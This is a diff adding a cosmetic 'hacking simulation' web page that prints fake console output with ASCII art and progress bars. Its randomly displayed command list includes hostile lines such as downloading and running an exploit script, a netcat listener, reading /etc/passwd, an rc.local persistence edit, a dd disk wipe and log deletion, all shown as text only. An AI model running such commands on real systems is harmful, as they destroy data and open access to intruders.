@@ -1,0 +1,238 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Hacking Simulation</title>
+    <style>
+        body {
+            background-color: #000;
+            color: #00ff00;
+            font-family: 'Courier New', monospace;
+            font-size: 12px;
+            line-height: 1.2;
+            margin: 0;
+            padding: 0;
+            overflow: hidden;
+            height: 100vh;
+        }
+        #console {
+            white-space: pre;
+            padding: 10px;
+            overflow-y: scroll;
+            height: 100%;
+            box-sizing: border-box;
+        }
+        #console::-webkit-scrollbar {
+            display: none;
+        }
+        .cypher { 
+            color: #ff0000; 
+            font-size: 12px;
+            font-weight: bold; 
+        }
+        .green { color: #00ff00; }
+        .red { color: #ff5555; }
+        .yellow { color: #ffff00; }
+        .blue { color: #0000ff; }
+        .cyan { color: #00ffff; }
+        .orange { color: #ffa500; }
+        .progress-bar {
+            display: flex;
+            align-items: center;
+            margin-top: 5px;
+        }
+        .progress-bar span {
+            font-size: 12px;
+        }
+    </style>
+</head>
+<body>
+    <div id="console"></div>
+
+    <script>
+        const consoleDiv = document.getElementById('console');
+        const TOTAL_LINES = 250; // Total lines to simulate before completing
+
+        const cypherArt = `
+───────────────────────────────────────────────────────────────────────────────────────────────────
+─██████████████─████████──████████─██████████████─██████──██████─██████████████─████████████████───
+─██░░░░░░░░░░██─██░░░░██──██░░░░██─██░░░░░░░░░░██─██░░██──██░░██─██░░░░░░░░░░██─██░░░░░░░░░░░░██───
+─██░░██████████─████░░██──██░░████─██░░██████░░██─██░░██──██░░██─██░░██████████─██░░████████░░██───
+─██░░██───────────██░░░░██░░░░██───██░░██──██░░██─██░░██──██░░██─██░░██─────────██░░██────██░░██───
+─██░░██───────────████░░░░░░████───██░░██████░░██─██░░██████░░██─██░░██████████─██░░████████░░██───
+─██░░██─────────────████░░████─────██░░░░░░░░░░██─██░░░░░░░░░░██─██░░░░░░░░░░██─██░░░░░░░░░░░░██───
+─██░░██───────────────██░░██───────██░░██████████─██░░██████░░██─██░░██████████─██░░██████░░████───
+─██░░██───────────────██░░██───────██░░██─────────██░░██──██░░██─██░░██─────────██░░██──██░░██─────
+─██░░██████████───────██░░██───────██░░██─────────██░░██──██░░██─██░░██████████─██░░██──██░░██████─
+─██░░░░░░░░░░██───────██░░██───────██░░██─────────██░░██──██░░██─██░░░░░░░░░░██─██░░██──██░░░░░░██─
+─██████████████───────██████───────██████─────────██████──██████─██████████████─██████──██████████─
+───────────────────────────────────────────────────────────────────────────────────────────────────
+        `;
+
+        function printInitialMessages(index = 0) {
+            const initialMessages = [
+                'Initializing the command-line interface...',
+                'Loading kernel operations...',
+                'Preparing system environment...',
+                'Setting up network protocols...',
+                'Establishing secure connection...',
+                'Please wait, transitioning to command-line interface...'
+            ];
+
+            if (index < initialMessages.length) {
+                consoleDiv.innerHTML += `<span class="cyan">${initialMessages[index]}</span>\n`;
+                consoleDiv.scrollTop = consoleDiv.scrollHeight;
+                
+                setTimeout(() => printInitialMessages(index + 1), Math.random() * 500 + 500);
+            } else {
+                setTimeout(printCypherArt, 500);
+            }
+        }
+
+        function printCypherArt() {
+            consoleDiv.innerHTML += `<span class="cypher">${cypherArt}</span>\n`;
+            consoleDiv.scrollTop = consoleDiv.scrollHeight;
+            setTimeout(() => startHackingSimulation(0), 500);
+        }
+
+        function getRandomProgressBarHeading() {
+            const headings = [
+                'Loading system modules...',
+                'Initializing core components...',
+                'Configuring network settings...',
+                'Verifying system integrity...',
+                'Deploying security protocols...',
+                'Updating core libraries...',
+                'Refreshing system services...'
+            ];
+            return headings[Math.floor(Math.random() * headings.length)];
+        }
+
+        function simulateProgressBar(taskName, progress = 0, callback) {
+            if (progress <= 100) {
+                const heading = getRandomProgressBarHeading();
+                let progressBar = '━'.repeat(Math.floor(progress / 2)) + ' '.repeat(50 - Math.floor(progress / 2));
+                let progressText = `${heading}: [${progressBar}] ${progress}% ${Math.random().toFixed(1)} MB/s eta ${(Math.random() * 0.5).toFixed(1)}s`;
+
+                // Find the last progress line
+                const lines = consoleDiv.innerHTML.split('\n');
+                const lastLineIndex = lines.length - 2; // Last line before the newline
+                lines[lastLineIndex] = `<span class="cyan">${progressText}</span>`; // Update the last line
+                
+                // Update consoleDiv with new progress line
+                consoleDiv.innerHTML = lines.join('\n');
+                consoleDiv.scrollTop = consoleDiv.scrollHeight;
+
+                // Increase progress more rapidly and update frequently
+                setTimeout(() => simulateProgressBar(taskName, progress + 5, callback), 100);
+            } else {
+                consoleDiv.innerHTML += `<span class="green">${taskName} Completed.</span>\n`;
+                consoleDiv.scrollTop = consoleDiv.scrollHeight;
+                if (callback) {
+                    setTimeout(callback, 500);
+                }
+            }
+        }
+
+        function generateLinuxCommand() {
+            const commands = [
+                'curl -s http://site | tar xz',
+                'wget http://site -O /tmp/exploit.sh',
+                'chmod +x /tmp/exploit.sh',
+                '/tmp/exploit.sh',
+                'find / -name "*.log"',
+                'nc -lvp 4444',
+                'ssh user@host "cat /etc/passwd"',
+                'echo "code" >> /etc/rc.local',
+                'dd if=/dev/zero of=/dev/sda bs=1M count=1',
+                'rm -rf /var/log/*',
+                'tar -cvf archive.tar /path/',
+                'gzip -c file.txt > file.txt.gz',
+                'openssl enc -aes-256-cbc -in file.txt -out file.txt.enc',
+                'md5sum file.txt',
+                'sha256sum file.txt',
+                'df -h',
+                'top -n 1',
+                'ps aux | grep process',
+                'lsof -i :80',
+                'netstat -tuln',
+                'grep -r "pattern" /path/'
+            ];
+            return commands[Math.floor(Math.random() * commands.length)];
+        }
+
+        function generateMessage() {
+            const messages = [
+                'Initiating SQL Injection Attack...',
+                'Overwriting system files...',
+                'Accessing root privileges...',
+                'Establishing backdoor access...',
+                'Bypassing firewall protections...',
+                'Decrypting sensitive data...',
+                'Compromising user credentials...',
+                'Injecting malicious payload...',
+                'Clearing log files...',
+                'Executing remote code...',
+                'Disabling security protocols...',
+                'Scanning for vulnerabilities...',
+                'Spreading ransomware...',
+                'Injecting exploit into kernel...',
+                'Modifying system configurations...'
+            ];
+            return messages[Math.floor(Math.random() * messages.length)];
+        }
+
+        function generateLine() {
+            const indentations = ['    ', '        ', '            '];
+            const indentation = indentations[Math.floor(Math.random() * indentations.length)];
+            const lineContent = generateLinuxCommand();
+            const coloredLine = colorLine(lineContent);
+            return `${indentation}${coloredLine}`;
+        }
+
+        function colorLine(lineContent) {
+            const randomFactor = Math.random();
+            let colorClass = 'green';
+            if (randomFactor < 0.1) {
+                colorClass = 'red';
+            } else if (randomFactor < 0.2) {
+                colorClass = 'yellow';
+            } else if (randomFactor < 0.3) {
+                colorClass = 'blue';
+            } else if (randomFactor < 0.4) {
+                colorClass = 'cyan';
+            } else if (randomFactor < 0.5) {
+                colorClass = 'orange';
+            }
+            return `<span class="${colorClass}">${lineContent}</span>`;
+        }
+
+        function startHackingSimulation(lineIndex = 0) {
+            if (lineIndex < TOTAL_LINES) {
+                if (lineIndex % 30 === 0) { // Show progress bar every 30 lines
+                    simulateProgressBar('Initializing system...', Math.min(lineIndex / 3, 100), () => {
+                        setTimeout(() => {
+                            consoleDiv.innerHTML += generateLine() + '\n';
+                            consoleDiv.scrollTop = consoleDiv.scrollHeight;
+                            setTimeout(() => startHackingSimulation(lineIndex + 1), Math.random() * 200 + 100);
+                        }, 500); // Delay after progress bar
+                    });
+                } else {
+                    consoleDiv.innerHTML += generateLine() + '\n';
+                    consoleDiv.scrollTop = consoleDiv.scrollHeight;
+                    setTimeout(() => startHackingSimulation(lineIndex + 1), Math.random() * 200 + 100);
+                }
+            } else {
+                setTimeout(() => {
+                    consoleDiv.innerHTML += `<span class="green">Hacking sequence completed successfully.</span>\n`;
+                    consoleDiv.scrollTop = consoleDiv.scrollHeight;
+                }, 500);
+            }
+        }
+
+        // Start the simulation
+        printInitialMessages();
+    </script>
+</body>
+</html>
